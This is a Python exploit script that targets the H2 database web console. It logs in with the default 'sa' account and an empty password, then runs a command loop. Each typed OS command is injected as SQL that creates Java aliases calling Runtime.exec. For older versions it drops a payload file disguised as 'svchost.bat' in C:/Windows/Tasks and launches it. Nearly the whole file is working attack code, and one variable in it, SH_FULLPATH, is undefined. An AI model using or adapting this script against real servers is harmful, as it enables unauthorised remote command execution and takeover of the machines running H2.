import requests
import re
import sys
import base64
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
TARGET_URL = "http://127.0.0.1:8082"
FAKEDB_SA_NULL_PASSWORD = "jdbc:h2:~/test"  # Change as needed
PLATFORM = "windows"  # Change as needed
OUTPUT_DIRECTORY = "C:/Windows/Tasks" if PLATFORM.lower() == "windows" else "/dev/shm/"
BAT_FULLPATH = "C:/Windows/Tasks/svchost.bat" if PLATFORM.lower() == "windows" else "/dev/shm/crontab.sh"
HEADERS = {
    "Cache-Control": "max-age=0",
    "Host": "127.0.0.1",
    "Upgrade-Insecure-Requests": "1",
    "Origin": f"{TARGET_URL}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": f"{TARGET_URL}/login.do",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive"
}

def get_jsessionid():
    url_auth_bypass = f"{TARGET_URL}/login.do"
    response = requests.get(url_auth_bypass, headers=HEADERS, verify=False)
    if response.status_code != 200:
        logging.error("Failed to get JSESSIONID")
        sys.exit(1)
    
    jsessionid_match = re.findall(r"login.jsp\?jsessionid=(.*?)\';", response.text)
    if not jsessionid_match:
        logging.error("JSESSIONID not found in response")
        sys.exit(1)
    
    return jsessionid_match[0]

def authenticate(jsessionid):
    url_auth_bypass = f"{TARGET_URL}/login.do?jsessionid={jsessionid}"
    data_auth_bypass = {
        "language": "en",
        "setting": "Generic H2 (Server)",
        "name": "Generic H2 (Server)",
        "driver": "org.h2.Driver",
        "url": FAKEDB_SA_NULL_PASSWORD,
        "user": "sa",
        "password": ''
    }
    
    response = requests.post(url_auth_bypass, headers=HEADERS, data=data_auth_bypass, verify=False)
    err1 = "not found, either pre-create it or allow remote database creation (not recommended in secure environments)"
    err2 = "is larger than the supported format"
    if err1 in response.text or err2 in response.text:
        logging.error("Failed to authenticate to the database")
        sys.exit(1)

def execute_command(jsessionid, command):
    url_cmd_query = f"{TARGET_URL}/query.do?jsessionid={jsessionid}"
    headers_cmd_query = HEADERS.copy()
    headers_cmd_query["Referer"] = f"{TARGET_URL}/query.jsp?jsessionid={jsessionid}"
    
    # Encode the command in UTF-16LE and convert to Base64
    command_bytes = command.encode('utf-16le')
    base64_command = base64.b64encode(command_bytes).decode('ascii')
    
    sql_old_ver_query = generate_sql_old_version(base64_command)
    sql_new_ver_query = generate_sql_new_version(command)
    
    data_cmd_query = {
        "sql": sql_old_ver_query + sql_new_ver_query
    }
    
    response = requests.post(url_cmd_query, headers=headers_cmd_query, data=data_cmd_query)
    if response.status_code != 200:
        logging.error("Failed to execute command")
        logging.debug(f"Response: {response.text}")

def generate_sql_old_version(base64_command):
    if PLATFORM.lower() == "windows":
        return f"""-- H2 Database OLD versions RCE [1.1.101 ~ 1.4?]
        DROP ALIAS IF EXISTS PWSH_INJECT;
        CREATE FORCE ALIAS PWSH_INJECT FOR "a.
        powershell -nop -ep bypass -enc {base64_command}
        ";
        SCRIPT SIMPLE NODATA NOSETTINGS TO '{BAT_FULLPATH}';
        CREATE TABLE EXPLOIT(ID INT PRIMARY KEY, NAME VARCHAR(255));
        INSERT INTO EXPLOIT (ID, NAME) VALUES (1, 'file://{BAT_FULLPATH}');
        CREATE FORCE ALIAS OPEN_URL FOR "org.h2.util.StartBrowser.openURL";
        CALL OPEN_URL(SELECT NAME FROM EXPLOIT);
        CREATE FORCE ALIAS OPEN_BROWSER FOR "org.h2.tools.Server.openBrowser";
        CALL OPEN_BROWSER(SELECT NAME FROM EXPLOIT);
        DROP TABLE EXPLOIT;"""
    else:
        return f"""-- H2 Database OLD versions RCE [1.1.101 ~ 1.4?]
        DROP ALIAS IF EXISTS PWSH_INJECT;
        CREATE FORCE ALIAS PWSH_INJECT FOR "a.
        {base64_command}
        ";
        SCRIPT SIMPLE NODATA NOSETTINGS TO '{SH_FULLPATH}';
        CREATE TABLE EXPLOIT(ID INT PRIMARY KEY, NAME VARCHAR(255));
        INSERT INTO EXPLOIT (ID, NAME) VALUES (1, 'file://{SH_FULLPATH}');
        CREATE FORCE ALIAS OPEN_URL FOR "org.h2.util.StartBrowser.openURL";
        CALL OPEN_URL(SELECT NAME FROM EXPLOIT);
        CREATE FORCE ALIAS OPEN_BROWSER FOR "org.h2.tools.Server.openBrowser";
        CALL OPEN_BROWSER(SELECT NAME FROM EXPLOIT);
        DROP TABLE EXPLOIT;"""

def generate_sql_new_version(command):
    return f"""-- H2 Database NEW versions RCE >=1.4?
    DROP ALIAS IF EXISTS CMD_INJECT ;
    CREATE FORCE ALIAS CMD_INJECT AS $$
    void pwshInject() throws Exception {{
        Runtime.getRuntime().exec("{command}");
    }}
    $$;
    CALL CMD_INJECT();"""

if __name__ == "__main__":
    jsessionid = get_jsessionid()
    authenticate(jsessionid)
    
    while True:
        command = input("COMMAND> ")
        execute_command(jsessionid, command)
